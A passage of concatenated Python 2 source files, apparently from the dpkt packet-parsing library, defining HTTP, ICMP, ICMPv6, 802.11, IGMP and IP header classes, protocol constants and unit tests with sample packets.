        self.uri = l[1]
        self.version = l[2][len(self.__proto)+1:]
        Message.unpack(self, f.read())

    def __str__(self):
        return '%s %s %s/%s\r\n' % (self.method, self.uri, self.__proto,
                                    self.version) + Message.__str__(self)

class Response(Message):
    """Hypertext Transfer Protocol Response."""
    __hdr_defaults__ = {
        'version':'1.0',
        'status':'200',
        'reason':'OK'
        }
    __proto = 'HTTP'
    
    def unpack(self, buf):
        f = cStringIO.StringIO(buf)
        line = f.readline()
        l = line.strip().split(None, 2)
        if len(l) < 2 or not l[0].startswith(self.__proto) or not l[1].isdigit():
            raise dpkt.UnpackError('invalid response: %r' % line)
        self.version = l[0][len(self.__proto)+1:]
        self.status = l[1]
        self.reason = l[2]
        Message.unpack(self, f.read())

    def __str__(self):
        return '%s/%s %s %s\r\n' % (self.__proto, self.version, self.status,
                                    self.reason) + Message.__str__(self)

if __name__ == '__main__':
    import unittest

    class HTTPTest(unittest.TestCase):
        def test_parse_request(self):
            s = """POST /main/redirect/ab/1,295,,00.html HTTP/1.0\r\nReferer: http://www.email.com/login/snap/login.jhtml\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; OpenBSD 2.8 i386; Nav)\r\nHost: ltd.snap.com\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\nContent-type: application/x-www-form-urlencoded\r\nContent-length: 61\r\n\r\nsn=em&mn=dtest4&pw=this+is+atest&fr=true&login=Sign+in&od=www"""
            r = Request(s)
            assert r.method == 'POST'
            assert r.uri == '/main/redirect/ab/1,295,,00.html'
            assert r.body == 'sn=em&mn=dtest4&pw=this+is+atest&fr=true&login=Sign+in&od=www'
            assert r.headers['content-type'] == 'application/x-www-form-urlencoded'
            try:
                r = Request(s[:60])
                assert 'invalid headers parsed!'
            except dpkt.UnpackError:
                pass

        def test_format_request(self):
            r = Request()
            assert str(r) == 'GET / HTTP/1.0\r\n\r\n'
            r.method = 'POST'
            r.uri = '/foo/bar/baz.html'
            r.headers['content-type'] = 'text/plain'
            r.headers['content-length'] = '5'
            r.body = 'hello'
            assert str(r) == 'POST /foo/bar/baz.html HTTP/1.0\r\ncontent-length: 5\r\ncontent-type: text/plain\r\n\r\nhello'
            r = Request(str(r))
            assert str(r) == 'POST /foo/bar/baz.html HTTP/1.0\r\ncontent-length: 5\r\ncontent-type: text/plain\r\n\r\nhello'

        def test_chunked_response(self):
            s = """HTTP/1.1 200 OK\r\nCache-control: no-cache\r\nPragma: no-cache\r\nContent-Type: text/javascript; charset=utf-8\r\nContent-Encoding: gzip\r\nTransfer-Encoding: chunked\r\nSet-Cookie: S=gmail=agg:gmail_yj=v2s:gmproxy=JkU; Domain=.google.com; Path=/\r\nServer: GFE/1.3\r\nDate: Mon, 12 Dec 2005 22:33:23 GMT\r\n\r\na\r\n\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00\r\n152\r\nm\x91MO\xc4 \x10\x86\xef\xfe\n\x82\xc9\x9eXJK\xe9\xb6\xee\xc1\xe8\x1e6\x9e4\xf1\xe0a5\x86R\xda\x12Yh\x80\xba\xfa\xef\x85\xee\x1a/\xf21\x99\x0c\xef0<\xc3\x81\xa0\xc3\x01\xe6\x10\xc1<\xa7eYT5\xa1\xa4\xac\xe1\xdb\x15:\xa4\x9d\x0c\xfa5K\x00\xf6.\xaa\xeb\x86\xd5y\xcdHY\x954\x8e\xbc*h\x8c\x8e!L7Y\xe6\'\xeb\x82WZ\xcf>8\x1ed\x87\x851X\xd8c\xe6\xbc\x17Z\x89\x8f\xac \x84e\xde\n!]\x96\x17i\xb5\x02{{\xc2z0\x1e\x0f#7\x9cw3v\x992\x9d\xfc\xc2c8\xea[/EP\xd6\xbc\xce\x84\xd0\xce\xab\xf7`\'\x1f\xacS\xd2\xc7\xd2\xfb\x94\x02N\xdc\x04\x0f\xee\xba\x19X\x03TtW\xd7\xb4\xd9\x92\n\xbcX\xa7;\xb0\x9b\'\x10$?F\xfd\xf3CzPt\x8aU\xef\xb8\xc8\x8b-\x18\xed\xec<\xe0\x83\x85\x08!\xf8"[\xb0\xd3j\x82h\x93\xb8\xcf\xd8\x9b\xba\xda\xd0\x92\x14\xa4a\rc\reM\xfd\x87=X;h\xd9j;\xe0db\x17\xc2\x02\xbd\xb0F\xc2in#\xfb:\xb6\xc4x\x15\xd6\x9f\x8a\xaf\xcf)\x0b^\xbc\xe7i\x11\x80\x8b\x00D\x01\xd8/\x82x\xf6\xd8\xf7J(\xae/\x11p\x1f+\xc4p\t:\xfe\xfd\xdf\xa3Y\xfa\xae4\x7f\x00\xc5\xa5\x95\xa1\xe2\x01\x00\x00\r\n0\r\n\r\n"""
            r = Response(s)
            assert r.version == '1.1'
            assert r.status == '200'
            assert r.reason == 'OK'

        def test_multicookie_response(self):
            s = """HTTP/1.x 200 OK\r\nSet-Cookie: first_cookie=cookie1; path=/; domain=.example.com\r\nSet-Cookie: second_cookie=cookie2; path=/; domain=.example.com\r\nContent-Length: 0\r\n\r\n"""
            r = Response(s)
            assert type(r.headers['set-cookie']) is list
            assert len(r.headers['set-cookie']) == 2

    unittest.main()

########NEW FILE########
__FILENAME__ = icmp
# $Id: icmp.py 45 2007-08-03 00:05:22Z jon.oberheide $

"""Internet Control Message Protocol."""

import dpkt, ip

# Types (icmp_type) and codes (icmp_code) -
# http://www.iana.org/assignments/icmp-parameters

ICMP_CODE_NONE			= 0	# for types without codes
ICMP_ECHOREPLY		= 0	# echo reply
ICMP_UNREACH		= 3	# dest unreachable, codes:
ICMP_UNREACH_NET		= 0	# bad net
ICMP_UNREACH_HOST		= 1	# bad host
ICMP_UNREACH_PROTO		= 2	# bad protocol
ICMP_UNREACH_PORT		= 3	# bad port
ICMP_UNREACH_NEEDFRAG		= 4	# IP_DF caused drop
ICMP_UNREACH_SRCFAIL		= 5	# src route failed
ICMP_UNREACH_NET_UNKNOWN	= 6	# unknown net
ICMP_UNREACH_HOST_UNKNOWN	= 7	# unknown host
ICMP_UNREACH_ISOLATED		= 8	# src host isolated
ICMP_UNREACH_NET_PROHIB		= 9	# for crypto devs
ICMP_UNREACH_HOST_PROHIB	= 10	# ditto
ICMP_UNREACH_TOSNET		= 11	# bad tos for net
ICMP_UNREACH_TOSHOST		= 12	# bad tos for host
ICMP_UNREACH_FILTER_PROHIB	= 13	# prohibited access
ICMP_UNREACH_HOST_PRECEDENCE	= 14	# precedence error
ICMP_UNREACH_PRECEDENCE_CUTOFF	= 15	# precedence cutoff
ICMP_SRCQUENCH		= 4	# packet lost, slow down
ICMP_REDIRECT		= 5	# shorter route, codes:
ICMP_REDIRECT_NET		= 0	# for network
ICMP_REDIRECT_HOST		= 1	# for host
ICMP_REDIRECT_TOSNET		= 2	# for tos and net
ICMP_REDIRECT_TOSHOST		= 3	# for tos and host
ICMP_ALTHOSTADDR	= 6	# alternate host address
ICMP_ECHO		= 8	# echo service
ICMP_RTRADVERT		= 9	# router advertise, codes:
ICMP_RTRADVERT_NORMAL		= 0	# normal
ICMP_RTRADVERT_NOROUTE_COMMON	= 16	# selective routing
ICMP_RTRSOLICIT		= 10	# router solicitation
ICMP_TIMEXCEED		= 11	# time exceeded, code:
ICMP_TIMEXCEED_INTRANS		= 0	# ttl==0 in transit
ICMP_TIMEXCEED_REASS		= 1	# ttl==0 in reass
ICMP_PARAMPROB		= 12	# ip header bad
ICMP_PARAMPROB_ERRATPTR		= 0	# req. opt. absent
ICMP_PARAMPROB_OPTABSENT	= 1	# req. opt. absent
ICMP_PARAMPROB_LENGTH		= 2	# bad length
ICMP_TSTAMP		= 13	# timestamp request
ICMP_TSTAMPREPLY	= 14	# timestamp reply
ICMP_INFO		= 15	# information request
ICMP_INFOREPLY		= 16	# information reply
ICMP_MASK		= 17	# address mask request
ICMP_MASKREPLY		= 18	# address mask reply
ICMP_TRACEROUTE		= 30	# traceroute
ICMP_DATACONVERR	= 31	# data conversion error
ICMP_MOBILE_REDIRECT	= 32	# mobile host redirect
ICMP_IP6_WHEREAREYOU	= 33	# IPv6 where-are-you
ICMP_IP6_IAMHERE	= 34	# IPv6 i-am-here
ICMP_MOBILE_REG		= 35	# mobile registration req
ICMP_MOBILE_REGREPLY	= 36	# mobile registration reply
ICMP_DNS		= 37	# domain name request
ICMP_DNSREPLY		= 38	# domain name reply
ICMP_SKIP		= 39	# SKIP
ICMP_PHOTURIS		= 40	# Photuris
ICMP_PHOTURIS_UNKNOWN_INDEX	= 0	# unknown sec index
ICMP_PHOTURIS_AUTH_FAILED	= 1	# auth failed
ICMP_PHOTURIS_DECOMPRESS_FAILED	= 2	# decompress failed
ICMP_PHOTURIS_DECRYPT_FAILED	= 3	# decrypt failed
ICMP_PHOTURIS_NEED_AUTHN	= 4	# no authentication
ICMP_PHOTURIS_NEED_AUTHZ	= 5	# no authorization
ICMP_TYPE_MAX		= 40

class ICMP(dpkt.Packet):
    __hdr__ = (
        ('type', 'B', 8),
        ('code', 'B', 0),
        ('sum', 'H', 0)
        )
    class Echo(dpkt.Packet):
        __hdr__ = (('id', 'H', 0), ('seq', 'H', 0))
    class Quote(dpkt.Packet):
        __hdr__ = (('pad', 'I', 0),)
        def unpack(self, buf):
            dpkt.Packet.unpack(self, buf)
            self.data = self.ip = ip.IP(self.data)
    class Unreach(Quote):
        __hdr__ = (('pad', 'H', 0), ('mtu', 'H', 0))
    class Quench(Quote):
        pass
    class Redirect(Quote):
        __hdr__ = (('gw', 'I', 0),)
    class ParamProbe(Quote):
        __hdr__ = (('ptr', 'B', 0), ('pad1', 'B', 0), ('pad2', 'H', 0))
    class TimeExceed(Quote):
        pass
    
    _typesw = { 0:Echo, 3:Unreach, 4:Quench, 5:Redirect, 8:Echo,
                11:TimeExceed }
    
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        try:
            self.data = self._typesw[self.type](self.data)
            setattr(self, self.data.__class__.__name__.lower(), self.data)
        except (KeyError, dpkt.UnpackError):
            pass

    def __str__(self):
        if not self.sum:
            self.sum = dpkt.in_cksum(dpkt.Packet.__str__(self))
        return dpkt.Packet.__str__(self)

if __name__ == '__main__':
    import unittest

    class ICMPTestCase(unittest.TestCase):
        def test_ICMP(self):
            s = '\x03\x0a\x6b\x19\x00\x00\x00\x00\x45\x00\x00\x28\x94\x1f\x00\x00\xe3\x06\x99\xb4\x23\x2b\x24\x00\xde\x8e\x84\x42\xab\xd1\x00\x50\x00\x35\xe1\x29\x20\xd9\x00\x00\x00\x22\x9b\xf0\xe2\x04\x65\x6b'
            icmp = ICMP(s)
            self.failUnless(str(icmp) == s)

    unittest.main()

########NEW FILE########
__FILENAME__ = icmp6
# $Id: icmp6.py 23 2006-11-08 15:45:33Z dugsong $

"""Internet Control Message Protocol for IPv6."""

import dpkt, ip6

ICMP6_DST_UNREACH            = 1       # dest unreachable, codes:
ICMP6_PACKET_TOO_BIG         = 2       # packet too big
ICMP6_TIME_EXCEEDED          = 3       # time exceeded, code:
ICMP6_PARAM_PROB             = 4       # ip6 header bad

ICMP6_ECHO_REQUEST           = 128     # echo service
ICMP6_ECHO_REPLY             = 129     # echo reply
MLD_LISTENER_QUERY           = 130     # multicast listener query
MLD_LISTENER_REPORT          = 131     # multicast listener report
MLD_LISTENER_DONE            = 132     # multicast listener done

# RFC2292 decls
ICMP6_MEMBERSHIP_QUERY       = 130     # group membership query
ICMP6_MEMBERSHIP_REPORT      = 131     # group membership report
ICMP6_MEMBERSHIP_REDUCTION   = 132     # group membership termination

ND_ROUTER_SOLICIT            = 133     # router solicitation
ND_ROUTER_ADVERT             = 134     # router advertisment
ND_NEIGHBOR_SOLICIT          = 135     # neighbor solicitation
ND_NEIGHBOR_ADVERT           = 136     # neighbor advertisment
ND_REDIRECT                  = 137     # redirect

ICMP6_ROUTER_RENUMBERING     = 138     # router renumbering

ICMP6_WRUREQUEST             = 139     # who are you request
ICMP6_WRUREPLY               = 140     # who are you reply
ICMP6_FQDN_QUERY             = 139     # FQDN query
ICMP6_FQDN_REPLY             = 140     # FQDN reply
ICMP6_NI_QUERY               = 139     # node information request
ICMP6_NI_REPLY               = 140     # node information reply

ICMP6_MAXTYPE                = 201

class ICMP6(dpkt.Packet):
    __hdr__ = (
        ('type', 'B', 0),
        ('code', 'B', 0),
        ('sum', 'H', 0)
        )
    class Error(dpkt.Packet):
        __hdr__ = (('pad', 'I', 0), )
        def unpack(self, buf):
            dpkt.Packet.unpack(self, buf)
            self.data = self.ip6 = ip6.IP6(self.data)
    class Unreach(Error):
        pass
    class TooBig(Error):
        __hdr__ = (('mtu', 'I', 1232), )
    class TimeExceed(Error):
        pass
    class ParamProb(Error):
        __hdr__ = (('ptr', 'I', 0), )

    class Echo(dpkt.Packet):
        __hdr__ = (('id', 'H', 0), ('seq', 'H', 0))
    
    _typesw = { 1:Unreach, 2:TooBig, 3:TimeExceed, 4:ParamProb,
                128:Echo, 129:Echo }
    
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        try:
            self.data = self._typesw[self.type](self.data)
            setattr(self, self.data.__class__.__name__.lower(), self.data)
        except (KeyError, dpkt.UnpackError):
            self.data = buf

########NEW FILE########
__FILENAME__ = ieee80211
# $Id: 80211.py 53 2008-12-18 01:22:57Z jon.oberheide $

"""IEEE 802.11."""

import dpkt

# Frame Types
MANAGEMENT          = 0
CONTROL             = 1
DATA                = 2

# Frame Sub-Types
M_ASSOC_REQ         = 0
M_ASSOC_RESP        = 1
M_REASSOC_REQ       = 2
M_REASSOC_RESP      = 3
M_PROBE_REQ         = 4
M_PROBE_RESP        = 5
C_PS_POLL           = 10
C_RTS               = 11
C_CTS               = 12
C_ACK               = 13
C_CF_END            = 14
C_CF_END_ACK        = 15
D_DATA              = 0
D_DATA_CF_ACK       = 1
D_DATA_CF_POLL      = 2
D_DATA_CF_ACK_POLL  = 3
D_NULL              = 4
D_CF_ACK            = 5
D_CF_POLL           = 6
D_CF_ACK_POLL       = 7

# Bitshifts for Frame Control
_VERSION_MASK       = 0x0300
_TYPE_MASK          = 0x0c00
_SUBTYPE_MASK       = 0xf000
_TO_DS_MASK         = 0x0001
_FROM_DS_MASK       = 0x0002
_MORE_FRAG_MASK     = 0x0004
_RETRY_MASK         = 0x0008
_PWR_MGT_MASK       = 0x0010
_MORE_DATA_MASK     = 0x0020
_WEP_MASK           = 0x0040
_ORDER_MASK         = 0x0080
_VERSION_SHIFT      = 8
_TYPE_SHIFT         = 10
_SUBTYPE_SHIFT      = 12
_TO_DS_SHIFT        = 0
_FROM_DS_SHIFT      = 1
_MORE_FRAG_SHIFT    = 2
_RETRY_SHIFT        = 3
_PWR_MGT_SHIFT      = 4
_MORE_DATA_SHIFT    = 5
_WEP_SHIFT          = 6
_ORDER_SHIFT        = 7

class IEEE80211(dpkt.Packet):
    __hdr__ = (
        ('framectl', 'H', 0),
        ('duration', 'H', 0)
        )

    def _get_version(self): return (self.framectl & _VERSION_MASK) >> _VERSION_SHIFT
    def _set_version(self, val): self.framectl = (val << _VERSION_SHIFT) | (self.framectl & ~_VERSION_MASK)
    def _get_type(self): return (self.framectl & _TYPE_MASK) >> _TYPE_SHIFT
    def _set_type(self, val): self.framectl = (val << _TYPE_SHIFT) | (self.framectl & ~_TYPE_MASK)
    def _get_subtype(self): return (self.framectl & _SUBTYPE_MASK) >> _SUBTYPE_SHIFT
    def _set_subtype(self, val): self.framectl = (val << _SUBTYPE_SHIFT) | (self.framectl & ~_SUBTYPE_MASK)
    def _get_to_ds(self): return (self.framectl & _TO_DS_MASK) >> _TO_DS_SHIFT
    def _set_to_ds(self, val): self.framectl = (val << _TO_DS_SHIFT) | (self.framectl & ~_TO_DS_MASK)
    def _get_from_ds(self): return (self.framectl & _FROM_DS_MASK) >> _FROM_DS_SHIFT
    def _set_from_ds(self, val): self.framectl = (val << _FROM_DS_SHIFT) | (self.framectl & ~_FROM_DS_MASK)
    def _get_more_frag(self): return (self.framectl & _MORE_FRAG_MASK) >> _MORE_FRAG_SHIFT
    def _set_more_frag(self, val): self.framectl = (val << _MORE_FRAG_SHIFT) | (self.framectl & ~_MORE_FRAG_MASK)
    def _get_retry(self): return (self.framectl & _RETRY_MASK) >> _RETRY_SHIFT
    def _set_retry(self, val): self.framectl = (val << _RETRY_SHIFT) | (self.framectl & ~_RETRY_MASK)
    def _get_pwr_mgt(self): return (self.framectl & _PWR_MGT_MASK) >> _PWR_MGT_SHIFT
    def _set_pwr_mgt(self, val): self.framectl = (val << _PWR_MGT_SHIFT) | (self.framectl & ~_PWR_MGT_MASK)
    def _get_more_data(self): return (self.framectl & _MORE_DATA_MASK) >> _MORE_DATA_SHIFT
    def _set_more_data(self, val): self.framectl = (val << _MORE_DATA_SHIFT) | (self.framectl & ~_MORE_DATA_MASK)
    def _get_wep(self): return (self.framectl & _WEP_MASK) >> _WEP_SHIFT
    def _set_wep(self, val): self.framectl = (val << _WEP_SHIFT) | (self.framectl & ~_WEP_MASK)
    def _get_order(self): return (self.framectl & _ORDER_MASK) >> _ORDER_SHIFT
    def _set_order(self, val): self.framectl = (val << _ORDER_SHIFT) | (self.framectl & ~_ORDER_MASK)

    version = property(_get_version, _set_version)
    type = property(_get_type, _set_type)
    subtype = property(_get_subtype, _set_subtype)
    to_ds = property(_get_to_ds, _set_to_ds)
    from_ds = property(_get_from_ds, _set_from_ds)
    more_frag = property(_get_more_frag, _set_more_frag)
    retry = property(_get_retry, _set_retry)
    pwr_mgt = property(_get_pwr_mgt, _set_pwr_mgt)
    more_data = property(_get_more_data, _set_more_data)
    wep = property(_get_wep, _set_wep)
    order = property(_get_order, _set_order)

    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        self.data = buf[self.__hdr_len__:]

        if self.type == CONTROL:
            if self.subtype == C_RTS:
                self.data = self.rts = self.RTS(self.data)
            if self.subtype == C_CTS:
                self.data = self.cts = self.CTS(self.data)
            if self.subtype == C_ACK:
                self.data = self.ack = self.ACK(self.data)

    class RTS(dpkt.Packet):
        __hdr__ = (
            ('dst', '6s', '\x00' * 6),
            ('src', '6s', '\x00' * 6)
            )

    class CTS(dpkt.Packet):
        __hdr__ = (
            ('dst', '6s', '\x00' * 6),
            )

    class ACK(dpkt.Packet):
        __hdr__ = (
            ('dst', '6s', '\x00' * 6),
            )

if __name__ == '__main__':
    import unittest
    
    class IEEE80211TestCase(unittest.TestCase):
        def test_802211(self):
            s = '\xd4\x00\x00\x00\x00\x12\xf0\xb6\x1c\xa4'
            ieee = IEEE80211(s)
            self.failUnless(str(ieee) == s)
            self.failUnless(ieee.version == 0)
            self.failUnless(ieee.type == CONTROL)
            self.failUnless(ieee.subtype == C_ACK)
            self.failUnless(ieee.to_ds == 0)
            self.failUnless(ieee.from_ds == 0)
            self.failUnless(ieee.pwr_mgt == 0)
            self.failUnless(ieee.more_data == 0)
            self.failUnless(ieee.wep == 0)
            self.failUnless(ieee.order == 0)
            self.failUnless(ieee.ack.dst == '\x00\x12\xf0\xb6\x1c\xa4')

    unittest.main()

########NEW FILE########
__FILENAME__ = igmp
# $Id: igmp.py 23 2006-11-08 15:45:33Z dugsong $

"""Internet Group Management Protocol."""

import dpkt

class IGMP(dpkt.Packet):
    __hdr__ = (
        ('type', 'B', 0),
        ('maxresp', 'B', 0),
        ('sum', 'H', 0),
        ('group', 'I', 0)
        )
    def __str__(self):
        if not self.sum:
            self.sum = dpkt.in_cksum(dpkt.Packet.__str__(self))
        return dpkt.Packet.__str__(self)

########NEW FILE########
__FILENAME__ = ip
# $Id: ip.py 65 2010-03-26 02:53:51Z dugsong $

"""Internet Protocol."""

import dpkt

class IP(dpkt.Packet):
    __hdr__ = (
        ('v_hl', 'B', (4 << 4) | (20 >> 2)),
        ('tos', 'B', 0),
        ('len', 'H', 20),
        ('id', 'H', 0),
        ('off', 'H', 0),
        ('ttl', 'B', 64),
        ('p', 'B', 0),
        ('sum', 'H', 0),
        ('src', '4s', '\x00' * 4),
        ('dst', '4s', '\x00' * 4)
        )
    _protosw = {}
    opts = ''

    def _get_v(self): return self.v_hl >> 4
    def _set_v(self, v): self.v_hl = (v << 4) | (self.v_hl & 0xf)
    v = property(_get_v, _set_v)
    
    def _get_hl(self): return self.v_hl & 0xf
    def _set_hl(self, hl): self.v_hl = (self.v_hl & 0xf0) | hl
    hl = property(_get_hl, _set_hl)

    def __len__(self):
        return self.__hdr_len__ + len(self.opts) + len(self.data)
    
    def __str__(self):
        if self.sum == 0:
            self.sum = dpkt.in_cksum(self.pack_hdr() + self.opts)
            if (self.p == 6 or self.p == 17) and \
               (self.off & (IP_MF|IP_OFFMASK)) == 0 and \
               isinstance(self.data, dpkt.Packet) and self.data.sum == 0:
                # Set zeroed TCP and UDP checksums for non-fragments.
                p = str(self.data)
                s = dpkt.struct.pack('>4s4sxBH', self.src, self.dst,
                                     self.p, len(p))
                s = dpkt.in_cksum_add(0, s)
                s = dpkt.in_cksum_add(s, p)
                self.data.sum = dpkt.in_cksum_done(s)
                if self.p == 17 and self.data.sum == 0:
                    self.data.sum = 0xffff	# RFC 768
                # XXX - skip transports which don't need the pseudoheader
        return self.pack_hdr() + self.opts + str(self.data)
    
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        ol = ((self.v_hl & 0xf) << 2) - self.__hdr_len__
        if ol < 0:
            raise dpkt.UnpackError, 'invalid header length'
        self.opts = buf[self.__hdr_len__:self.__hdr_len__ + ol]
        buf = buf[self.__hdr_len__ + ol:self.len]
        try:
            self.data = self._protosw[self.p](buf)
            setattr(self, self.data.__class__.__name__.lower(), self.data)
        except (KeyError, dpkt.UnpackError):
            self.data = buf

    def set_proto(cls, p, pktclass):
        cls._protosw[p] = pktclass
    set_proto = classmethod(set_proto)

    def get_proto(cls, p):
        return cls._protosw[p]
    get_proto = classmethod(get_proto)
    
# Type of service (ip_tos), RFC 1349 ("obsoleted by RFC 2474")
IP_TOS_DEFAULT		= 0x00	# default
IP_TOS_LOWDELAY		= 0x10	# low delay
IP_TOS_THROUGHPUT	= 0x08	# high throughput
IP_TOS_RELIABILITY	= 0x04	# high reliability
IP_TOS_LOWCOST		= 0x02	# low monetary cost - XXX
IP_TOS_ECT		= 0x02	# ECN-capable transport
IP_TOS_CE		= 0x01	# congestion experienced

# IP precedence (high 3 bits of ip_tos), hopefully unused
IP_TOS_PREC_ROUTINE		= 0x00
IP_TOS_PREC_PRIORITY		= 0x20
IP_TOS_PREC_IMMEDIATE		= 0x40
IP_TOS_PREC_FLASH		= 0x60
IP_TOS_PREC_FLASHOVERRIDE	= 0x80
IP_TOS_PREC_CRITIC_ECP		= 0xa0
IP_TOS_PREC_INTERNETCONTROL	= 0xc0
IP_TOS_PREC_NETCONTROL		= 0xe0

# Fragmentation flags (ip_off)
IP_RF		= 0x8000	# reserved
IP_DF		= 0x4000	# don't fragment
IP_MF		= 0x2000	# more fragments (not last frag)
IP_OFFMASK	= 0x1fff	# mask for fragment offset

# Time-to-live (ip_ttl), seconds
IP_TTL_DEFAULT	= 64		# default ttl, RFC 1122, RFC 1340
IP_TTL_MAX	= 255		# maximum ttl

# Protocol (ip_p) - http://www.iana.org/assignments/protocol-numbers
IP_PROTO_IP		= 0		# dummy for IP
IP_PROTO_HOPOPTS	= IP_PROTO_IP	# IPv6 hop-by-hop options
IP_PROTO_ICMP		= 1		# ICMP
IP_PROTO_IGMP		= 2		# IGMP
IP_PROTO_GGP		= 3		# gateway-gateway protocol
IP_PROTO_IPIP		= 4		# IP in IP
IP_PROTO_ST		= 5		# ST datagram mode
IP_PROTO_TCP		= 6		# TCP
IP_PROTO_CBT		= 7		# CBT
IP_PROTO_EGP		= 8		# exterior gateway protocol
IP_PROTO_IGP		= 9		# interior gateway protocol
IP_PROTO_BBNRCC		= 10		# BBN RCC monitoring
IP_PROTO_NVP		= 11		# Network Voice Protocol
IP_PROTO_PUP		= 12		# PARC universal packet
IP_PROTO_ARGUS		= 13		# ARGUS
IP_PROTO_EMCON		= 14		# EMCON
IP_PROTO_XNET		= 15		# Cross Net Debugger
IP_PROTO_CHAOS		= 16		# Chaos
IP_PROTO_UDP		= 17		# UDP
IP_PROTO_MUX		= 18		# multiplexing
IP_PROTO_DCNMEAS	= 19		# DCN measurement
IP_PROTO_HMP		= 20		# Host Monitoring Protocol
IP_PROTO_PRM		= 21		# Packet Radio Measurement
IP_PROTO_IDP		= 22		# Xerox NS IDP
IP_PROTO_TRUNK1		= 23		# Trunk-1
IP_PROTO_TRUNK2		= 24		# Trunk-2
IP_PROTO_LEAF1		= 25		# Leaf-1
IP_PROTO_LEAF2		= 26		# Leaf-2
IP_PROTO_RDP		= 27		# "Reliable Datagram" proto
IP_PROTO_IRTP		= 28		# Inet Reliable Transaction
IP_PROTO_TP		= 29 		# ISO TP class 4
IP_PROTO_NETBLT		= 30		# Bulk Data Transfer
IP_PROTO_MFPNSP		= 31		# MFE Network Services
IP_PROTO_MERITINP	= 32		# Merit Internodal Protocol
IP_PROTO_SEP		= 33		# Sequential Exchange proto
IP_PROTO_3PC		= 34		# Third Party Connect proto
IP_PROTO_IDPR		= 35		# Interdomain Policy Route
IP_PROTO_XTP		= 36		# Xpress Transfer Protocol
IP_PROTO_DDP		= 37		# Datagram Delivery Proto
IP_PROTO_CMTP		= 38		# IDPR Ctrl Message Trans
IP_PROTO_TPPP		= 39		# TP++ Transport Protocol
IP_PROTO_IL		= 40		# IL Transport Protocol
IP_PROTO_IP6		= 41		# IPv6
IP_PROTO_SDRP		= 42		# Source Demand Routing
IP_PROTO_ROUTING	= 43		# IPv6 routing header
IP_PROTO_FRAGMENT	= 44		# IPv6 fragmentation header
IP_PROTO_RSVP		= 46		# Reservation protocol
IP_PROTO_GRE		= 47		# General Routing Encap
IP_PROTO_MHRP		= 48		# Mobile Host Routing
IP_PROTO_ENA		= 49		# ENA
IP_PROTO_ESP		= 50		# Encap Security Payload
IP_PROTO_AH		= 51		# Authentication Header
IP_PROTO_INLSP		= 52		# Integated Net Layer Sec
IP_PROTO_SWIPE		= 53		# SWIPE
IP_PROTO_NARP		= 54		# NBMA Address Resolution
IP_PROTO_MOBILE		= 55		# Mobile IP, RFC 2004
IP_PROTO_TLSP		= 56		# Transport Layer Security
IP_PROTO_SKIP		= 57		# SKIP
IP_PROTO_ICMP6		= 58		# ICMP for IPv6
IP_PROTO_NONE		= 59		# IPv6 no next header
IP_PROTO_DSTOPTS	= 60		# IPv6 destination options
IP_PROTO_ANYHOST	= 61		# any host internal proto
IP_PROTO_CFTP		= 62		# CFTP
IP_PROTO_ANYNET		= 63		# any local network
IP_PROTO_EXPAK		= 64		# SATNET and Backroom EXPAK
IP_PROTO_KRYPTOLAN	= 65		# Kryptolan
IP_PROTO_RVD		= 66		# MIT Remote Virtual Disk
IP_PROTO_IPPC		= 67		# Inet Pluribus Packet Core
IP_PROTO_DISTFS		= 68		# any distributed fs
IP_PROTO_SATMON		= 69		# SATNET Monitoring
IP_PROTO_VISA		= 70		# VISA Protocol
IP_PROTO_IPCV		= 71		# Inet Packet Core Utility
IP_PROTO_CPNX		= 72		# Comp Proto Net Executive
IP_PROTO_CPHB		= 73		# Comp Protocol Heart Beat
IP_PROTO_WSN		= 74		# Wang Span Network
IP_PROTO_PVP		= 75		# Packet Video Protocol
IP_PROTO_BRSATMON	= 76		# Backroom SATNET Monitor
IP_PROTO_SUNND		= 77		# SUN ND Protocol
IP_PROTO_WBMON		= 78		# WIDEBAND Monitoring
IP_PROTO_WBEXPAK	= 79		# WIDEBAND EXPAK
IP_PROTO_EON		= 80		# ISO CNLP
IP_PROTO_VMTP		= 81		# Versatile Msg Transport
IP_PROTO_SVMTP		= 82		# Secure VMTP
IP_PROTO_VINES		= 83		# VINES
IP_PROTO_TTP		= 84		# TTP
IP_PROTO_NSFIGP		= 85		# NSFNET-IGP
IP_PROTO_DGP		= 86		# Dissimilar Gateway Proto
IP_PROTO_TCF		= 87		# TCF
IP_PROTO_EIGRP		= 88		# EIGRP
IP_PROTO_OSPF		= 89		# Open Shortest Path First
IP_PROTO_SPRITERPC	= 90		# Sprite RPC Protocol
IP_PROTO_LARP		= 91		# Locus Address Resolution
IP_PROTO_MTP		= 92		# Multicast Transport Proto
IP_PROTO_AX25		= 93		# AX.25 Frames
IP_PROTO_IPIPENCAP	= 94		# yet-another IP encap
IP_PROTO_MICP		= 95		# Mobile Internet Ctrl
IP_PROTO_SCCSP		= 96		# Semaphore Comm Sec Proto
IP_PROTO_ETHERIP	= 97		# Ethernet in IPv4
IP_PROTO_ENCAP		= 98		# encapsulation header
IP_PROTO_ANYENC		= 99		# private encryption scheme
IP_PROTO_GMTP		= 100		# GMTP
IP_PROTO_IFMP		= 101		# Ipsilon Flow Mgmt Proto
IP_PROTO_PNNI		= 102		# PNNI over IP
IP_PROTO_PIM		= 103		# Protocol Indep Multicast
IP_PROTO_ARIS		= 104		# ARIS
IP_PROTO_SCPS		= 105		# SCPS
IP_PROTO_QNX		= 106		# QNX
IP_PROTO_AN		= 107		# Active Networks
IP_PROTO_IPCOMP		= 108		# IP Payload Compression
IP_PROTO_SNP		= 109		# Sitara Networks Protocol
IP_PROTO_COMPAQPEER	= 110		# Compaq Peer Protocol
IP_PROTO_IPXIP		= 111		# IPX in IP
IP_PROTO_VRRP		= 112		# Virtual Router Redundancy
IP_PROTO_PGM		= 113		# PGM Reliable Transport
IP_PROTO_ANY0HOP	= 114		# 0-hop protocol
IP_PROTO_L2TP		= 115		# Layer 2 Tunneling Proto
IP_PROTO_DDX		= 116		# D-II Data Exchange (DDX)
IP_PROTO_IATP		= 117		# Interactive Agent Xfer
IP_PROTO_STP		= 118		# Schedule Transfer Proto
